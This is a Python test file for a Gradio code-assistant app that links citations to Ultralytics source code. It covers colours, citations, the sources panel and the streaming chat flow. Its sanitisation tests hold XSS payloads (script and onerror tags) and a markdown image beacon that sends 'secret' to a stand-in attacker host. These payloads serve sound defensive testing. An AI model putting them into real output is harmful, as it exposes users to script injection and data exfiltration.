import gradio as gr
from pymongo.errors import ServerSelectionTimeoutError

from code_assistant.app import (
    NO_ANSWER,
    build_filters,
    citation_url,
    label_text_color,
    linkify_citations,
    render_sources,
    render_status,
    respond,
    source_color,
)
from code_assistant.assistant import Answer
from code_assistant.llm import Attempt, LLMError
from code_assistant.retrieval import SearchResult

URL = "https://github.com/ultralytics/ultralytics/blob/abc/ultralytics/engine/trainer.py#L10-L20"


def source(name: str = "BaseTrainer.train", code: str = "def train(self): ...") -> SearchResult:
    return SearchResult(
        id=name, kind="method", path="ultralytics/engine/trainer.py", qualified_name=name,
        code=code, start_line=10, end_line=20, github_url=URL, score=0.873,
    )  # fmt: skip


SOURCES = [source("A.one"), source("B.two"), source("C.three")]


# -- colours -------------------------------------------------------------------------------


def test_source_colours_cycle_through_the_ultralytics_palette():
    assert source_color(1) == "#042AFF"
    assert source_color(7) == source_color(1)


def test_label_text_is_readable_on_dark_and_light_swatches():
    assert label_text_color("#042AFF") == "#FFFFFF"  # dark blue -> white text
    assert label_text_color("#0BDBEB") == "#111F68"  # light cyan -> navy text


# -- citations -----------------------------------------------------------------------------


def test_citation_url_adds_marker_before_the_line_fragment():
    assert citation_url(SOURCES[0], 1) == URL.replace("#L10", "?source=1#L10")


def test_linkify_turns_citations_into_coloured_links():
    text = linkify_citations("Use resume [1]. Also [2, 3] and 【1】.", SOURCES)

    assert f"[1]({citation_url(SOURCES[0], 1)})" in text
    assert f"[2]({citation_url(SOURCES[1], 2)})[3]({citation_url(SOURCES[2], 3)})" in text
    assert text.count("?source=1#") == 2  # the full-width 【1】 too


def test_linkify_leaves_invalid_numbers_code_and_indexing_alone():
    text = (
        "Bad cite [9]. Indexing results[1] and boxes[2]. "
        "Inline `xywh[:, 2]` and `arr[1]`.\n```python\nfirst = results[1]\n```\nThen [1]."
    )

    out = linkify_citations(text, SOURCES)

    assert "Bad cite [9]." in out  # no source 9: stays visible as plain text
    assert "results[1] and boxes[2]" in out
    assert "`arr[1]`" in out and "first = results[1]" in out
    assert out.endswith(f"Then [1]({citation_url(SOURCES[0], 1)}).")


def test_linkify_handles_an_unclosed_code_block_while_streaming():
    out = linkify_citations("See [1].\n```python\nx = y[1]", SOURCES)

    assert "?source=1#" in out and "x = y[1]" in out


def test_linkify_does_not_double_link_existing_markdown_links():
    assert linkify_citations("[1](https://example.com)", SOURCES) == "[1](https://example.com)"


# -- sources panel -------------------------------------------------------------------------


def test_sources_panel_escapes_everything():
    evil = source(name="<script>alert(1)</script>", code="</code><img src=x onerror=alert(1)>")

    rendered = render_sources([evil])

    assert "<script>" not in rendered and "<img" not in rendered
    assert "&lt;script&gt;" in rendered


def test_sources_panel_marks_cited_and_uncited_boxes_after_the_answer():
    rendered = render_sources(SOURCES, cited=[1, 3], answered=True)

    assert rendered.count('class="detection cited"') == 2
    assert rendered.count('class="detection uncited"') == 1
    assert "2 of 3 retrieved code units are cited" in rendered
    assert "0.87" in rendered and "lines 10–20" in rendered


def test_sources_panel_states():
    assert "appears here" in render_sources([])
    assert "ranked by similarity" in render_sources(SOURCES)
    assert "doesn't cite any" in render_sources(SOURCES, cited=[], answered=True)


# -- status --------------------------------------------------------------------------------


def answer(**kwargs) -> Answer:
    defaults = {"question": "q", "text": "t [1]", "sources": SOURCES, "model": "x/model",
                "latency_s": 2.34, "citations": [1]}  # fmt: skip
    return Answer(**{**defaults, **kwargs})


def test_status_reports_model_fallback_truncation_and_bad_citations():
    status = render_status(
        answer(
            failed_attempts=(Attempt("a/model", "HTTP 429: busy"),),
            truncated=True,
            citations=[1, 7],
        )
    )

    assert "Answered by x/model in 2.3 s." in status
    assert "Tried first: a/model (rate-limited)." in status
    assert "cut off" in status
    assert "[7]" in status


def test_status_escapes_error_text():
    assert "<b>" not in render_status(error="<b>boom</b>")


def test_build_filters_ignores_any():
    assert build_filters("Any", "Any") is None
    assert build_filters("engine", "Any") == {"folder": "engine"}
    assert build_filters("models", "segment") == {"folder": "models", "task": "segment"}


# -- conversation flow ---------------------------------------------------------------------


class FakeAssistant:
    def __init__(self, events=None, error=None):
        self.events, self.error, self.calls = events or [], error, []

    def ask_stream(self, question, history=(), filters=None):
        self.calls.append((question, list(history), filters))
        yield from self.events
        if self.error:
            raise self.error


def run(assistant, message="How?", chat=None, history=None, folder="Any", task="Any"):
    return list(respond(assistant, message, chat or [], history or [], folder, task))


def test_respond_streams_sources_then_text_then_final_answer():
    final = answer(text="Use resume [1].", citations=[1])
    assistant = FakeAssistant([SOURCES, "Use ", "resume [1].", final])

    updates = run(assistant, folder="engine")

    first, *middle, last = updates
    assert first[0] == ""  # textbox cleared once...
    assert all(u[0] == gr.skip() for u in updates[1:])  # ...and never again while streaming
    assert "Searching the code" in first[4]
    textbox, chat, history, sources_html, status = last
    assert chat[-1]["content"] == f"Use resume [1]({citation_url(SOURCES[0], 1)})."
    assert history == [
        {"role": "user", "content": "How?"},
        {"role": "assistant", "content": "Use resume [1]."},  # raw text for the LLM
    ]
    assert 'class="detection cited"' in sources_html
    assert "Answered by x/model" in status
    assert assistant.calls[0][2] == {"folder": "engine"}


def test_respond_passes_previous_turns_for_follow_ups():
    previous = [{"role": "user", "content": "a"}, {"role": "assistant", "content": "b"}]
    assistant = FakeAssistant([SOURCES, answer()])

    run(assistant, history=previous)

    assert assistant.calls[0][1] == previous


def test_respond_ignores_empty_messages():
    assistant = FakeAssistant()

    (update,) = run(assistant, message="   ")

    assert update[1] == [] and assistant.calls == []


def test_respond_reports_when_no_model_answers():
    assistant = FakeAssistant([SOURCES], error=LLMError("All models failed:\n  - a/m: HTTP 429: x"))

    *_, last = run(assistant)

    assert last[1][-1]["content"] == NO_ANSWER
    assert "a/m (rate-limited)" in last[4]


def test_respond_keeps_partial_text_if_the_model_fails_mid_answer():
    assistant = FakeAssistant([SOURCES, "Partial"], error=LLMError("m failed mid-answer: boom"))

    *_, last = run(assistant)

    assert last[1][-1]["content"] == "Partial"


def test_respond_reports_database_errors():
    assistant = FakeAssistant(error=ServerSelectionTimeoutError("no route"))

    *_, last = run(assistant)

    assert "reach MongoDB Atlas" in last[4]  # (the apostrophe is HTML-escaped)


def test_respond_survives_unexpected_errors():
    assistant = FakeAssistant([SOURCES], error=RuntimeError("weird"))

    *_, last = run(assistant)

    assert "Unexpected error" in last[4]


def test_linkify_links_adjacent_citations():
    out = linkify_citations("Use it [2][3].", SOURCES)

    assert out == f"Use it [2]({citation_url(SOURCES[1], 2)})[3]({citation_url(SOURCES[2], 3)})."


def test_sources_note_counts_only_valid_citations():
    assert "1 of 3 retrieved" in render_sources(SOURCES, cited=[1, 0, 9], answered=True)


def test_render_answer_neutralises_markup_and_images_but_not_code():
    from code_assistant.app import render_answer

    text = (
        '<a style="position:fixed;inset:0" href="https://evil.example">x</a> '
        "![beacon](https://evil.example/p.png?d=secret) [1]\n```python\nif a < b: pass\n```"
    )

    out = render_answer(text, SOURCES)

    assert "<a style" not in out and "&lt;a style" in out
    assert "![" not in out and "[beacon](https://evil.example/p.png?d=secret)" in out
    assert "if a < b: pass" in out  # code untouched
    assert "?source=1#" in out


def test_every_palette_colour_meets_wcag_aa_with_its_label_ink():
    from code_assistant.app import PALETTE, contrast

    for colour in PALETTE:
        assert contrast(f"#{colour}", label_text_color(f"#{colour}")) >= 4.5, colour
